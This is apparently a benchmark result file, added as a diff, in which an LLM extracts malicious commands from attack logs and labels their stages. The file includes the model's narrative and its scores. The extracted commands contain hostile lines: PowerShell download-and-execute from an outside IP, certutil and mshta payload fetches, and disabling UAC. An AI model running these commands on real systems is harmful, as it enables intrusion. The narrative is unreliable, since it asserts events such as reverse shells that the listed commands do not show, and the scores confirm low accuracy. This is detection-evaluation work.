@@ -1,0 +1,135 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\tmp\tool.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"]",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "c:\tmp\tool.exe -update",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\5iftyvcm\\5iftyvcm.cmdline\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"Invoke-WebRequest http://124.223.85.207:8082\\/",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attackers initially gained access through an unknown means and created tools such as PowerShell scripts and compiled files using various techniques like downloadstrings() function which indicates they had an initial foothold in the network. They also created registry keys in order to persist themselves within the system. The attackers were able to execute arbitrary commands remotely via HTTP using web requests indicating they have established a command and control channel to their server located at IP address 124.223.85.207. During their activities, they tried to evade detection by changing registry values related to antivirus software. Furthermore, they collected information about the target machine using PowerShell scripts which suggests collection phase has been performed. Additionally, the attackers attempted privilege escalation by disabling windows defender but without success. They made several attempts to establish reverse shells via HTTP and HTTPS protocols to communicate back to their C&C server. Their actions conclude with some cleanup operations likely trying to remove indicators of compromise.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 167393,
+      "completion_tokens": 3126,
+      "total_tokens": 170519,
+      "wall_clock_s": 29.696,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.23809523809523808,
+      "recall": 0.1282051282051282,
+      "f1": 0.16666666666666666,
+      "tp": 5,
+      "fp": 16,
+      "fn": 34
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.07692307692307693,
+      "f1": 0.1,
+      "tp": 3,
+      "fp": 18,
+      "fn": 36,
+      "recall_partial": 0.05405405405405406
+    },
+    "hallucination_rate": 0.25,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 167393,
+      "completion_tokens": 3126,
+      "total_tokens": 170519,
+      "wall_clock_s": 29.696,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
